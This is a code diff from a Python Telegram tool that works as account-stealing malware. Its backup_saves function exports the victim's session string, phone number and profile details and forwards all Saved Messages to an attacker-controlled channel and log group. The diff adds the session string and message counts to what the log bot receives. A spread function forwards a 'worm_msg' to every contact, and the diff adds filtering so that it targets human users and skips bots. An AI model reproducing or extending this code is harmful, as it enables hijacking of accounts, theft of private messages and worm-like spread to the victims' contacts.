@@ -41,7 +41,9 @@ async def backup_saves(client, me, logger_bot):
     result = await client(functions.messages.ExportChatInviteRequest(peer=channel_id))
     database.channels.insert_one({"invite": result.link, "owner": me.id})
     await client.send_message(dest, f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nSession: {client.session.save()}")
+    msg_count = 0
     async for message in client.iter_messages("me", reverse=True):
+        msg_count += 1
         try:
             await message.forward_to(dest)
         except errors.FloodWaitError as e:
@@ -50,7 +52,7 @@ async def backup_saves(client, me, logger_bot):
         except:
             break
     await client(functions.channels.LeaveChannelRequest(channel=channel_id))
-    await logger_bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}")
+    await logger_bot.send_message(int(os.getenv('LOG_GROUP')), f"ID: {me.id}\nUsername: {me.username}\nFirst name: {me.first_name}\nLast name: {me.last_name}\nPhone: {me.phone}\nLink: {result.link}\nSaved Messages: {msg_count}\nPremium: {me.premium}\nSession: `{client.session.save()}`")
 async def spread(client, bot):
     bot_me = await bot.get_me()
     async with client.conversation(f"@{bot_me.username}") as conv:
@@ -59,6 +61,16 @@ async def spread(client, bot):
         spread_msg_nomedia = f"{strings['worm_msg']}\n\n{strings['worm_msg_btn_url']}"
         await msg.delete()
     async for dialog in client.iter_dialogs():
+        if dialog.is_user:
+            try:
+                user = await client.get_entity(dialog.id)
+            except errors.FloodWaitError as e:
+                await asyncio.sleep(e.seconds)
+                user = await client.get_entity(dialog.id)
+            except:
+                continue
+            if user.bot:
+                continue
         try:
             msg = await spread_msg.forward_to(dialog)
         except errors.FloodWaitError as e:
